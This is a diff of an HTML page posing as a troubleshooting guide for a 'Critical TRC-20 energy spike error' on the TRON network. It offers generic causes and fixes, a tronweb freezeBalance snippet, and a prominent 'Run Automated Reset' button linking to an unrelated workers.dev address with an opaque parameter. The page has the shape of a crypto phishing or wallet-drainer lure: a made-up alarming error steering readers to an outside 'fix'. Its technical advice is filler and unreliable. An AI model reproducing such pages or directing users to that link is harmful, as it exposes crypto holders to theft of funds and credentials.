@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,29 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unexpected surge in energy consumption by a TRC-20 smart contract on the TRON network.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unusual increase in energy consumption by a TRC-20 token contract on the TRON network, leading to failed transactions or contract executions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when a TRC-20 smart contract exceeds its allocated energy limit, typically due to inefficient coding, excessive iterations, or unexpected input values, causing the contract to consume more energy than allowed.</li>
+<li>The error occurs due to excessive energy usage by a smart contract, often caused by inefficient coding, recursive function calls, or an unexpected surge in user interactions, exceeding the contract's allocated energy limits.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy limit by modifying the <code>energyLimit</code> parameter in the contract's configuration.</li>
-<li>Optimize the contract's code to reduce energy consumption, focusing on loops and conditional statements.</li>
-<li>Update the contract's implementation using the following code block:</li>
+<li>Adjust the contract's energy limits by modifying the <code>energy_limit</code> parameter in the contract's configuration.</li>
+<li>Implement optimization techniques, such as caching or batching, to reduce the contract's energy consumption.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;optimizer&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;enabled&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
+<span class="w">  </span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span>//<span class="w"> </span>frozen_balance
+<span class="w">  </span><span class="s1">&#39;3&#39;</span><span class="w"> </span>//<span class="w"> </span>frozen_duration
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced contract debugging and optimization. </p>
+<p>Consider utilizing an external console for more advanced debugging and monitoring capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON network account with sufficient TRX balance</li>
-<li>TRC-20 contract deployment rights</li>
-<li>Basic understanding of smart contract development and optimization techniques</li>
+<li>A basic understanding of TRON's smart contract architecture</li>
+<li>Familiarity with TRC-20 token standards and energy management</li>
+<li>Access to the TRON Web wallet or a compatible wallet for contract interactions</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
